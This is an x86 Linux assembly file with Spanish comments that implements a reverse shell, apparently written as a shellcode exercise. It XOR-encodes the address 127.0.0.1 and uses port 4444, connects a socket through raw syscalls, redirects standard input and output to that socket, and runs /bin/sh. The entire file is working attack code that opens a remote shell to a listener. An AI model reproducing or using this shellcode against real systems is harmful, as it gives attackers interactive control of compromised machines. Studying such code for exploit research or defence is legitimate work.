
; Pacheco Franco Jesús Enrique
; Reverse Shell (asm)
; 14/Abril/2019

section .text

  global _start ; Directiva [Punto de Entrada]

  _start:

    ; Se crea un nuevo stackframe
    mov   ebp, esp

    ; Se limpian los registros a utilizar
    xor   eax, eax
    xor   ecx, ecx
    xor   edx, edx

    ; Se crea la estructura sockaddr_in
    push  eax
    push  eax             ; [$esp]: 8 bytes de relleno
    mov   eax, 0xffffffff
    mov   ebx, 0xfeffff80
    xor   ebx, eax
    push  ebx             ; [$esp]: 127.0.0.1
    push  word 0x5c11     ; [$esp]: 4444
    push  word 0x02       ; [$esp]: AF_INET

    ; Llamada al sistema [socket(int domain, int type, int protocol)]
    xor   eax, eax
    xor   ebx, ebx
    mov   ax, 0x167       ; $eax: 0x167 / 359
    mov   bl, 0x02        ; $ebx: AF_INET
    mov   cl, 0x01        ; $ecx: SOCK_STREAM
    int   0x80
    mov   ebx, eax        ; $ebx: Descriptor de archivo del socket

    ; Llamada al sistema [connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)]
    mov   ax, 0x16a
    mov   ecx, esp
    mov   edx, ebp
    sub   edx, esp        ; $ecx: Tamaño de la estructura sockaddr
    int   0x80

    ; Llamada a dup2 para redireccionar STDIN, STDOUT y STDERR al descriptor de archivod del
    ; socket
    xor   ecx, ecx
    mov   cl, 0x3
    dup:
    xor   eax, eax
    mov   al, 0x3f
    dec   ecx
    int   0x80
    inc   ecx
    loop  dup

    ; Se limpian los registros eax y edx
    ; Se ejecuta /bin/sh con execve
    xor   eax, eax
    xor   edx, edx
    push  eax
    push  0x68732f2f
    push  0x6e69622f
    mov   ebx, esp        ; [$ebx]: null terminated /bin//sh
    mov   al, 0x0b
    int   0x80